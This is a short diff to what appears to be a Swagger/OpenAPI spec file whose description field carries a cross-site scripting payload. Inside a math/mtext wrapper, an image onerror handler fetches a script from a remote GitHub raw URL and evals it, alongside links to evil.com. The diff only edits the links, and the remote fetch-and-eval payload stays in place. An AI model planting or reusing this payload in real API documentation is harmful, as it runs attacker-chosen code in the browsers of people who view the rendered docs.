@@ -4,13 +4,13 @@ info:
   description: |
     <math>
       <mtext>
-       <a href=evil.com>clickk</a>
+       <a href=https://evil.com>click</a>
         <img src onerror=fetch(`https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/script.js`)
                       .then(function(res){
                         res.text().then(function(data){
                           eval(data)
                         })
-                      })>'><a href=evil.com>clickk</a>
+                      })>'><a href=https://evil.com>click</a>
       </mtext>
     </math>
   version: production
